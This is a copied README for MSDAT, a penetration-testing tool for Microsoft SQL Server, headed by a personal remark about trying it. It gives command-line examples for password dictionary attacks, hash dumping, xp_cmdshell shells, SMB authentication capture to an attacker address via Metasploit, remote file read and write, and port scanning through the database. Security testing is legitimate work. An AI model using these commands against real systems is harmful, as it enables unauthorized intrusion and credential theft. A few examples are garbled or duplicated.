Note:  I didn't use this, but it'd be a good tool to try out

# MSDAT

MSDAT (**M**icro**s**oft SQL **D**atabase **A**ttacking **T**ool) is an open source penetration testing tool that tests the security of Microsoft SQL Databases remotely.

Usage examples of MSDAT:

- You have a Microsoft database listening remotely and you want to **find valid credentials** in order to connect to the database
- You have a valid Microsoft SQL account on a database and you want to **escalate your privileges**
- You have a valid Microsoft SQL account and you want to **execute commands on the operating system** hosting this DB (xp_cmdshell)

Tested on Microsoft SQL database 2005, 2008, 2012, 2014 and 2016.

# Features

Thanks to MSDAT (**M**icro**s**oft SQL **D**atabase **A**ttacking **T**ool), you can:

- **get technical information** (ex: database version) of a MSSQL database without to be authenticated

- **search MSSQL accounts** with a dictionary attack

- **test each login as password** (authentication required)

- get a windows shell

   on the database server with

  - xp_cmdshell

- download

   files remotely with:

  - OLE Automation
  - bulkinsert
  - openrowset

- upload

   files on the server with:

  - OLE Automation
  - openrowset

- capture a SMB authentication

   thanks to:

  - bulkinsert
  - openrowset
  - *xp_dirtree*
  - *xp_fileexist*
  - *xp-getfiledetails*

- **steal MSSQL hashed password**, on an any MSSQL version

- scan ports

   through the database:

  - openrowset

- execute SQL requests on a remote MSSQL server

   trough the database (target) with:

  - *bulkinsert*
  - *openrowset*

- list files/directories

   with:

  - *xp_subdirs*
  - *xp_dirtree*

- list drives/medias

   with:

  - *xp_fixeddrives*
  - *xp_availablemedia*

- create folder

   with:

  - *xp_create_subdir*

# 

# Installation

Some dependancies must be installed in order to run MSDAT.

In ubuntu:

```
sudo apt-get install freetds-dev 
```

or download freetds on http://www.freetds.org/

```
sudo pip install cython colorlog termcolor pymssql argparse
sudo pip install argcomplete && sudo activate-global-python-argcomplete
```

Add "use ntlmv2 = yes" in your freetds configuration file (ex: /etc/freetds/freetds.conf or /usr/local/etc/freetds.conf). Example:

```
[global]
        # TDS protocol version
        tds version = 8.0
        use ntlmv2 = yes
```

# Examples

## Modules

- You can list all modules:

```
./msdat.py -h
```

- When you have chosen a module (example: *all*), you can use it and you can list all features and options of the module:

```
./msdat.py all -h
```

You can know if a specific module can be used on a MSSQL server thanks to the ***--test-module*** option. This options is implemented in each mdat module.

## *all* module

The *all* module allows you to run all modules (depends on options that you have purchased).

```
python msdat.py all -s $SERVER
```

If you want:

- to use your own account file for the dictionnary attack
- try multiple passwords for a user without ask you
- to define your own timeout value

```
./msdat.py all -s $SERVER -p $PORT --accounts-file accounts.txt --login-timeout 10 --force-retry
```

In each module, you can define the charset to use with the *--charset* option.

## *mssqlinfo* module

To get technical information about a remote MSSQL server without to be authenticated:

```
./msdat.py mssqlinfo -s $SERVER -p $PORT --get-max-info
```

This module uses ***TDS protocol*** and ***SQL browser Server*** to get information.

## 

## *passwordguesser* module

This module allows you to search valid credentials :

```
./msdat.py passwordguesser -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --force-retry --search
```

*--force-retry* option allows to test multiple passwords for each user without ask you

You can specify your own account file with the *--accounts-file* option:

```
./msdat.py passwordguesser -s $SERVER -p $PORT --search --accounts-file accounts.txt --force-retry
```

## 

## *passwordstealer* module

To dump hashed passwords :

```
./msdat.py passwordstealer -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --dump --save-to-file test.txt
```

This modules has been tested on SQL Server 2000, 2005, 2008 and 2014.

## 

## *xpcmdshell* module

To execute system commands thanks to *xp_cmdshell* (https://msdn.microsoft.com/en-us/library/ms190693.aspx):

```
./msdat.py xpcmdshell -s $SERVER -p $PORT -U $USER -P $PASSWORD --shell
```

This previous command give you an interactive shell on the remote database server.

If *xp_cmdshell* is not enabled, the *--enable-xpcmdshell* can be used in this module to activate it:

```
./msdat.py xpcmdshell -s $SERVER -p $PORT -U $USER -P $PASSWORD --enable-xpcmdshell --disable-xpcmdshell --disable-xpcmdshell --shell
```

The *--enable-xpcmdshell* option enables *xp_cmdshell* if it is not enabled (not enabled by default).

The *--disable-xpcmdshell* option disables *xp_cmdshell* if this one is enabled.

## 

## *smbauthcapture* module

Thanks to this module, you can capture a SMB authentication:

```
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --capture $MY_IP_ADDRESS --share-name SHARE
```

To capture the SMB authentication, the *auxiliary/server/capture/smb* (http://www.rapid7.com/db/modules/auxiliary/server/capture/smb) module of metasploit could be used:

```
msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > exploit
```

The ***capture*** command of this module tries to capture a SMB authentication thanks to *xp_dirtree*, *xp_fileexist* or *xp-getfiledetails* procedure.

If you want to choose the SMB authentication procedure to capture the authentication:

```
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD --xp-dirtree-capture 127.0.0.1
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD --xp-fileexist-capture 127.0.0.1
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD --xp-getfiledetails-capture 127.0.0.1
```

You can change the SHARE name with the *--share-name* option.

## 

## *oleautomation* module

This module can be used to read/write file in the database server.

The following command read the file *temp.txt* stored in the database server:

```
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --read-file 'C:\Users\Administrator\Desktop\temp.txt'
```

To write a string in a file (*temp.txt*) remotely:

```
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --write-file 'C:\Users\Administrator\Desktop\temp.txt' 'a\nb\nc\nd\ne\nf'
```

This module can be used to download a file (*C:\Users\Administrator\Desktop\temp.txt*) stored on the database server:

```
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --get-file 'C:\Users\Administrator\Desktop\temp.txt' temp.txt
```

Also, you can use this module to upload a file (*temp.txt*) on the target:

```
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --put-file temp.txt 'C:\Users\Administrator\Desktop\temp.txt
```

## 

## *bulkopen* module

The module *bulkopen* can be used :

- to read/download files stored on a database server
- to scan ports through the database server
- to execute SQL requests on a remote MSSQL server through the database

To read a file stored in the target, the following command can be used:

```
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --read-file 'C:\Users\Administrator\Desktop\temp.txt'"
```

The *--method* option can be used to specify the method to use:

- *bulkinsert* (https://msdn.microsoft.com/en-us/library/ms188365.aspx) or
- *openrowset*(https://msdn.microsoft.com/en-us/library/ms190312.aspx)):

```
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --read-file 'C:\Users\Administrator\Desktop\temp.txt' --method openrowset
```

To download a file (*C:\Users\Administrator\Desktop\temp.txt*):` ``bash ./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d  $DATABASE --get-file 'C:\Users\Administrator\Desktop\temp.txt' temp.txt

```
This module can be used to scan ports (1433 and 1434 of 127.0.0.1) through the database server:
​```bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --scan-ports 127.0.0.1 1433,1434 -v
```

You can scan a range of ports:

```
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --scan-ports 127.0.0.1 1433-1438
```

This module can be used to execute SQL requests (ex: *select @@ServerName*) on a remote database server (ex: $SERVER2) through the database ($SERVER):

```
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --request-rdb $SERVER2 $PORT $DATABASE $USER $PASSWORD 'select @@ServerName'
```

## 

## *xpdirectory* module

The module *xpdirectory* can be used:

- to list:
- files
- directories
- drives
- to check if a file exists
- to create a directory

To list files in a specific directory:

```
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --list-files 'C:\'
```

To list directories in a specific directory:

```
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --list-dir 'C:\'
```

To list drives:

```
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --list-fixed-drives --list-available-media
```

To check if a file exist:

```
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --file-exists 'C:\' --file-exists 'file.txt'
```

To create a directory:

```
./msdat.py xpdirectory --s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --create-dir 'C:\temp'
```

## 

## *search* module

The module *search* can be used to search a pattern in column names of tables and views. Usefull to search the pattern *%password%* in column names for example.

To get column names which contains password patterns (ex: passwd, password, motdepasse, clave):

```
./msdat.py search -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --pwd-column-names --show-empty-columns
```

If you want to see column names which doesn't contain a data, you should use the option *--show-empty-columns*.

To search a specific pattern in column names of views and tables:

```
./msdat.py search -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --pwd-column-names --show-empty-columns
```